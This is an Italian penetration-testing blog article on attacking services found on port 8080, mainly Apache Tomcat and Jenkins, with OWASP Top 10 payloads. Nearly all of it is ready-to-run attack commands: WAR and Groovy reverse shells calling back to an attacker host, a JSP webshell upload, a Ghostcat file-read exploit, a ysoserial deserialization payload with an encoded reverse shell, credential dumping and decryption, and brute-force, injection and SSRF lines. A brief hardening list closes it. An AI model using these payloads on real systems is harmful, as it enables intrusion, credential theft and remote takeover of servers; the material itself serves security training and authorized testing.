---
title: 'Porta 8080 TCP: Tomcat, Jenkins e Vulnerabilità Web ad Alto Impatto'
slug: porta-8080-tomcat
description: 'La porta 8080 ospita spesso Apache Tomcat e Jenkins, due target chiave nei pentest web. Scopri enumerazione, Tomcat Manager, Jenkins RCE e i test più utili sulle vulnerabilità web più critiche.'
image: /porta-8080-tomcat.webp
draft: true
date: 2026-03-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - tomcat-manager
  - jenkins-rce
featured: true
---

La porta 8080 TCP è la porta HTTP alternativa per eccellenza. Mentre la [porta 80](https://hackita.it/articoli/porta-80-http) ospita il sito principale dell'azienda — tipicamente dietro WAF, CDN e reverse proxy — la 8080 ospita tutto il resto: **Apache Tomcat** (il server Java più deployato del pianeta), **Jenkins** (CI/CD — se lo controlli, controlli il codice di produzione), **proxy HTTP** aziendali, pannelli di amministrazione e servizi interni che "tanto nessuno li vede". Ed è proprio quella mentalità che li rende i target preferiti di un penetration test.

Questo articolo copre in profondità Apache Tomcat (il servizio più comune sulla 8080), Jenkins (il secondo) e le **vulnerabilità OWASP Top 10** con payload operativi da testare su qualsiasi servizio web che trovi su questa porta. Non teoria: comandi pronti all'uso.

## Cosa Trovi sulla Porta 8080

```bash
nmap -sV -p 8080 10.10.10.40
```

| Banner                                         | Servizio                    | Impatto                       |
| ---------------------------------------------- | --------------------------- | ----------------------------- |
| `Server: Apache-Coyote/1.1` o `Apache Tomcat`  | **Tomcat**                  | Alto — WAR deploy = shell     |
| `X-Jenkins` header o pagina Jenkins            | **Jenkins**                 | Critico — RCE via Groovy      |
| `Server: squid` o `Via:` header con cache info | **HTTP Proxy**              | Medio — pivoting rete interna |
| `Server: nginx` o `Apache` generico            | **Reverse proxy / Web app** | Variabile                     |
| `Server: WildFly` o `JBoss`                    | **JBoss/WildFly**           | Alto — deserializzazione Java |
| `X-Powered-By: Express`                        | **Node.js**                 | Medio                         |

```bash
curl -s http://10.10.10.40:8080/ -I
curl -s http://10.10.10.40:8080/ | head -80
```

***

## PARTE 1: Apache Tomcat

### Cos'è Tomcat

Apache Tomcat è il servlet container Java più diffuso: esegue applicazioni web Java (WAR files), JSP e servlet. Alimenta applicazioni enterprise, API backend, portali interni. La sua Tomcat Manager Web Application è il vettore di attacco principale: permette di deployare applicazioni — incluse webshell — via upload di file WAR.

### 1.1 Enumerazione Tomcat

```bash
# Pagina default
curl -s http://10.10.10.40:8080/
```

La pagina default di Tomcat mostra la versione. Se non c'è pagina default, cerca la versione nel header:

```bash
curl -s http://10.10.10.40:8080/ -I | grep -i "server"
```

```
Server: Apache-Coyote/1.1
```

`Apache-Coyote` = Tomcat (il connector si chiama Coyote).

```bash
# Path chiave da testare
curl -s http://10.10.10.40:8080/manager/html -I       # Manager GUI
curl -s http://10.10.10.40:8080/manager/text/list -I   # Manager API text
curl -s http://10.10.10.40:8080/manager/status -I      # Server status
curl -s http://10.10.10.40:8080/host-manager/html -I   # Host Manager
curl -s http://10.10.10.40:8080/docs/ -I               # Documentazione (rivela versione)
curl -s http://10.10.10.40:8080/examples/ -I           # Applicazioni esempio
```

Se `/manager/html` risponde `401 Unauthorized` → il Manager è attivo e richiede credenziali. Se `403 Forbidden` → il Manager è attivo ma il tuo IP non è nella whitelist. Se `404` → il Manager non è installato.

### 1.2 Default Credentials Tomcat

Le credenziali sono in `tomcat-users.xml`. Quelle di default cambiano per distribuzione:

| Username  | Password   | Ruolo                       |
| --------- | ---------- | --------------------------- |
| `tomcat`  | `tomcat`   | Il classico                 |
| `admin`   | `admin`    | Installazioni custom        |
| `manager` | `manager`  | Manager specifico           |
| `tomcat`  | `s3cret`   | Macchine HTB/OSCP classiche |
| `admin`   | `password` | Setup di test               |
| `role1`   | `role1`    | Utente esempio              |
| `both`    | `tomcat`   | Utente con entrambi i ruoli |
| `admin`   | *(vuota)*  | Alcune installazioni        |

```bash
# Test manuale con curl (Basic Auth)
curl -s -u "tomcat:tomcat" http://10.10.10.40:8080/manager/html -I
```

Se risponde `200` → sei dentro.

```bash
# Brute force con Hydra
hydra -L /usr/share/wordlists/tomcat_users.txt -P /usr/share/wordlists/tomcat_passwords.txt \
  10.10.10.40 http-get /manager/html -s 8080

# Metasploit scanner
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 10.10.10.40
set RPORT 8080
run
```

### 1.3 WAR Deploy — Da Manager a Shell

Il metodo classico: con accesso al Manager, deploya un file WAR contenente una webshell o una reverse shell Java.

```bash
# Genera WAR con msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.200 LPORT=4444 -f war -o revshell.war
```

```bash
# Deploy via Manager text API (più affidabile della GUI)
curl -u "tomcat:tomcat" http://10.10.10.40:8080/manager/text/deploy?path=/revshell \
  --upload-file revshell.war
```

```
OK - Deployed application at context path [/revshell]
```

```bash
# Listener
nc -lvnp 4444

# Trigger la reverse shell
curl http://10.10.10.40:8080/revshell/
```

```
[*] Connection from 10.10.10.40:49152
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Shell come utente `tomcat`.

```bash
# Con Metasploit (automatizzato)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.40
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 10.10.10.200
run
```

### 1.4 Undeploy — Pulizia Tracce

```bash
# Rimuovi l'applicazione dopo aver ottenuto la shell
curl -u "tomcat:tomcat" "http://10.10.10.40:8080/manager/text/undeploy?path=/revshell"
```

### 1.5 CVE Tomcat

**CVE-2020-1938 — Ghostcat (AJP, CVSS 9.8)**

Ghostcat sfrutta il protocollo AJP sulla porta 8009. Se AJP è attivo (default in Tomcat \< 9.0.31), permette di **leggere qualsiasi file** nella directory dell'applicazione e, in certi casi, RCE.

```bash
# Verifica porta AJP
nmap -sV -p 8009 10.10.10.40
```

```bash
# Exploit Ghostcat — leggi web.xml (contiene credenziali)
python3 ajpShooter.py http://10.10.10.40:8080 8009 /WEB-INF/web.xml read
```

```xml
<context-param>
    <param-name>db.password</param-name>
    <param-value>DB_Pr0d_2025!</param-value>
</context-param>
```

```bash
# Alternativa con ajpshooter
python3 ghostcat.py 10.10.10.40 -p 8009 -f /WEB-INF/web.xml
```

`/WEB-INF/web.xml` è il file di configurazione dell'applicazione Java — contiene spesso credenziali, path interni, configurazione servlet.

```bash
# File da leggere via Ghostcat
/WEB-INF/web.xml           # Config principale
/WEB-INF/classes/db.properties  # Credenziali database
/META-INF/context.xml       # Datasource JDBC
```

**CVE-2017-12615 — PUT File Upload RCE (Tomcat 7.x)**

```bash
# Upload diretto di un file JSP
curl -X PUT http://10.10.10.40:8080/cmd.jsp/ \
  -d '<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null){out.println(l);}%>'
```

```bash
curl "http://10.10.10.40:8080/cmd.jsp?c=id"
```

**CVE-2019-0232 — CGI Servlet RCE (Windows)**

```bash
curl "http://10.10.10.40:8080/cgi-bin/test.bat?&dir"
```

### 1.6 Post-Exploitation Tomcat

```bash
# Credenziali Tomcat dal filesystem
cat /opt/tomcat/conf/tomcat-users.xml
cat /etc/tomcat*/tomcat-users.xml
```

```xml
<user username="admin" password="Admin_T0mcat_2025!" roles="manager-gui,admin-gui"/>
```

```bash
# Configurazione datasource (credenziali database)
cat /opt/tomcat/conf/context.xml
cat /opt/tomcat/webapps/ROOT/META-INF/context.xml
```

```xml
<Resource name="jdbc/mydb" url="jdbc:mysql://db-prod:3306/app"
          username="webapp" password="W3bApp_DB_2025!"/>
```

Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql)/[PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql).

```bash
# Cerca .war files deployati (possono contenere credenziali)
find /opt/tomcat/webapps -name "*.properties" -exec grep -liE "password|secret" {} \;
```

Per l'escalation da utente tomcat: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc).

***

## PARTE 2: Jenkins

Se la 8080 ospita Jenkins:

```bash
# Identifica Jenkins
curl -s http://10.10.10.40:8080/ -I | grep "X-Jenkins"
```

```
X-Jenkins: 2.426.3
```

### Default credentials Jenkins

```
admin:admin
admin:password
admin:jenkins
```

### Script Console — RCE Immediata

Se hai accesso admin o la Script Console è raggiungibile:

```bash
curl -s http://10.10.10.40:8080/script
```

```groovy
// Esegui comando OS dalla Groovy console
def cmd = "id".execute()
println cmd.text
```

```groovy
// Reverse shell
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/10.10.10.200/4444 0>&1"].execute()
```

### Credenziali nei Job Jenkins

```bash
# Da una shell Jenkins
cat /var/lib/jenkins/credentials.xml
# Contiene credenziali criptate — decrypt con:
# jenkins-decrypt.py o dal Script Console:
```

```groovy
println(hudson.util.Secret.decrypt("{AES}encrypted_password_here"))
```

### Jenkins senza autenticazione

Alcune installazioni Jenkins sono raggiungibili senza login — verifica:

```bash
curl -s http://10.10.10.40:8080/api/json | python3 -m json.tool
```

Se risponde con dati → accesso non autenticato. Leggi job, build, configurazioni.

***

## PARTE 3: OWASP Top 10 — Payload Operativi

Qualsiasi cosa giri sulla 8080 (o su qualsiasi porta HTTP), queste sono le vulnerabilità da testare. Niente teoria — solo comandi.

### A01: Broken Access Control

Accesso a risorse che non dovresti raggiungere.

```bash
# IDOR — Incrementa ID per accedere a dati di altri utenti
curl -s http://10.10.10.40:8080/api/users/1       # Il tuo profilo
curl -s http://10.10.10.40:8080/api/users/2       # Profilo di un altro utente
curl -s http://10.10.10.40:8080/api/invoices/1001  # Fattura non tua

# Forced browsing — accedi a pagine admin senza auth
curl -s http://10.10.10.40:8080/admin/
curl -s http://10.10.10.40:8080/admin/users
curl -s http://10.10.10.40:8080/api/admin/config

# HTTP method tampering — un endpoint blocca GET ma non DELETE
curl -s -X DELETE http://10.10.10.40:8080/api/users/2
curl -s -X PUT http://10.10.10.40:8080/api/users/2 -d '{"role":"admin"}'

# Path traversal
curl -s "http://10.10.10.40:8080/download?file=../../../etc/passwd"
curl -s "http://10.10.10.40:8080/static/..%2f..%2f..%2f..%2fetc/passwd"
```

### A02: Cryptographic Failures

Dati sensibili trasmessi o salvati senza cifratura.

```bash
# La porta 8080 è HTTP (non HTTPS) → tutto in chiaro
# Se ci sono form di login sulla 8080, le credenziali passano in chiaro

# Cerca cookie senza flag Secure/HttpOnly
curl -s -v http://10.10.10.40:8080/login 2>&1 | grep "Set-Cookie"
# Set-Cookie: JSESSIONID=abc123; Path=/
# Manca Secure e HttpOnly → session hijacking possibile

# Backup files esposti (possono contenere credenziali)
curl -s http://10.10.10.40:8080/db_backup.sql
curl -s http://10.10.10.40:8080/database.sql.bak
curl -s http://10.10.10.40:8080/.env
curl -s http://10.10.10.40:8080/config.php.bak
```

### A03: Injection

```bash
# SQL Injection
sqlmap -u "http://10.10.10.40:8080/products?id=1" --dbs --batch
sqlmap -u "http://10.10.10.40:8080/search?q=test" --dbs --batch

# SQL injection manuale — test base
curl -s "http://10.10.10.40:8080/products?id=1' OR '1'='1"
curl -s "http://10.10.10.40:8080/products?id=1 UNION SELECT 1,2,3--"

# Command injection
curl -s "http://10.10.10.40:8080/ping?host=127.0.0.1;id"
curl -s "http://10.10.10.40:8080/ping?host=127.0.0.1|cat+/etc/passwd"
curl -s "http://10.10.10.40:8080/dns?domain=corp.com%0aid"

# LDAP injection
curl -s "http://10.10.10.40:8080/login" -d "user=*)(uid=*))(|(uid=*&pass=test"

# Template injection (SSTI)
curl -s "http://10.10.10.40:8080/greet?name={{7*7}}"         # Jinja2: 49
curl -s "http://10.10.10.40:8080/greet?name=${7*7}"           # Java EL: 49
curl -s "http://10.10.10.40:8080/greet?name=<%25=7*7%25>"     # ERB: 49
```

### A04: Insecure Design

```bash
# Password reset senza rate limit
for i in $(seq 1000 9999); do
    curl -s -X POST http://10.10.10.40:8080/api/reset-password \
      -d "email=admin@corp.com&otp=$i"
done

# Funzionalità di export che dumpa troppi dati
curl -s http://10.10.10.40:8080/api/export/users?format=csv
```

### A05: Security Misconfiguration

```bash
# Directory listing
curl -s http://10.10.10.40:8080/uploads/
curl -s http://10.10.10.40:8080/backup/

# Stack trace / error pages verbose
curl -s http://10.10.10.40:8080/api/test -X POST -d '{"invalid":}'

# Default pages e documentazione
curl -s http://10.10.10.40:8080/examples/
curl -s http://10.10.10.40:8080/docs/
curl -s http://10.10.10.40:8080/status
curl -s http://10.10.10.40:8080/server-status
curl -s http://10.10.10.40:8080/server-info

# CORS misconfiguration
curl -s http://10.10.10.40:8080/api/users -H "Origin: https://evil.com" -I | grep "Access-Control"
# Access-Control-Allow-Origin: * → chiunque può leggere le risposte API
```

### A06: Vulnerable and Outdated Components

```bash
# Identifica versioni
curl -s http://10.10.10.40:8080/ -I | grep "Server\|X-Powered"
# Cerca CVE per la versione identificata
searchsploit tomcat 9.0.30
searchsploit jenkins 2.300

# Scan automatico
nikto -h http://10.10.10.40:8080
nuclei -u http://10.10.10.40:8080 -t cves/
```

### A07: Identification and Authentication Failures

```bash
# Brute force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.40 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -s 8080

# Session fixation — il session ID cambia dopo il login?
curl -s -v http://10.10.10.40:8080/login 2>&1 | grep "Set-Cookie"
# Se il JSESSIONID è lo stesso prima e dopo il login → session fixation

# JWT weak secret
# Cattura un JWT dal header Authorization o dai cookie
# Prova a crackarlo con jwt_tool:
jwt_tool eyJ... -C -d /usr/share/wordlists/rockyou.txt
```

### A08: Software and Data Integrity Failures

```bash
# Deserializzazione Java (comune su 8080 con Tomcat/JBoss)
# Tool: ysoserial
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4yMDAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > payload.bin

# Invia il payload serializzato
curl -s http://10.10.10.40:8080/api/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

### A09: Security Logging and Monitoring Failures

```bash
# Non è una vuln che "sfrutti" direttamente, ma durante il pentest:
# - Lancia scan rumorosi (Nikto, Nuclei, directory brute) e verifica se il blue team reagisce
# - Se non reagiscono → finding: manca il monitoring
# - Testa se i log contengono credenziali (vedi sezione Kibana)
```

### A10: Server-Side Request Forgery (SSRF)

```bash
# Testa ogni parametro che accetta URL
curl -s "http://10.10.10.40:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://10.10.10.40:8080/proxy?target=http://127.0.0.1:6379/"
curl -s "http://10.10.10.40:8080/webhook?callback=http://10.10.10.200:8888/"

# SSRF per scansione porte interne
for port in 22 80 3306 5432 6379 8080 9200; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" "http://10.10.10.40:8080/fetch?url=http://127.0.0.1:$port/")
    echo "Port $port: HTTP $resp"
done

# SSRF per cloud metadata
curl -s "http://10.10.10.40:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Se ottieni credenziali AWS dal metadata → [AWS privilege escalation](https://hackita.it/articoli/aws-privilege-escalation).

***

## Detection & Hardening

* **Rimuovi il Tomcat Manager** se non necessario — cancella `/manager` e `/host-manager`
* **Credenziali forti** in `tomcat-users.xml` — non i default
* **Disabilita AJP** (porta 8009) se non usi un reverse proxy Apache con mod\_jk
* **Disabilita la pagina di errore verbose** — custom error pages
* **Rimuovi `/examples/` e `/docs/`** — information disclosure
* **Esegui Tomcat come utente non-root** con privilegi minimi
* **Aggiorna** regolarmente — Tomcat, librerie Java, WAR deployati
* **WAF** davanti alla 8080 come davanti alla 80
* **Audit OWASP** periodico sulle applicazioni deployate

## Cheat Sheet Finale

| Azione         | Comando                                                                         |
| -------------- | ------------------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 8080,8009 target`                                                  |
| Manager        | `curl -u tomcat:tomcat http://target:8080/manager/html`                         |
| Brute manager  | `use auxiliary/scanner/http/tomcat_mgr_login` (MSF)                             |
| WAR deploy     | `curl -u user:pass .../manager/text/deploy?path=/shell --upload-file shell.war` |
| Ghostcat       | `python3 ajpShooter.py http://target:8080 8009 /WEB-INF/web.xml read`           |
| PUT RCE        | `curl -X PUT http://target:8080/cmd.jsp/ -d 'JSP_CODE'`                         |
| Jenkins script | `curl http://target:8080/script` → Groovy `"cmd".execute()`                     |
| SQLi           | `sqlmap -u "http://target:8080/page?id=1" --dbs`                                |
| SSTI           | `curl "http://target:8080/page?name={{7*7}}"`                                   |
| SSRF           | `curl "http://target:8080/fetch?url=http://169.254.169.254/"`                   |
| Nikto          | `nikto -h http://target:8080`                                                   |
| Nuclei         | `nuclei -u http://target:8080 -t cves/`                                         |

***

Riferimento: Apache Tomcat Security, OWASP Top 10 2021, Jenkins Security, HackTricks. Uso esclusivo in ambienti autorizzati.

> La 8080 è la porta che tutti dimenticano di proteggere. Il [penetration test HackIta](https://hackita.it/servizi) la scansiona sempre. Per imparare l'exploitation da zero: [percorso formativo 1:1](https://hackita.it/formazione).
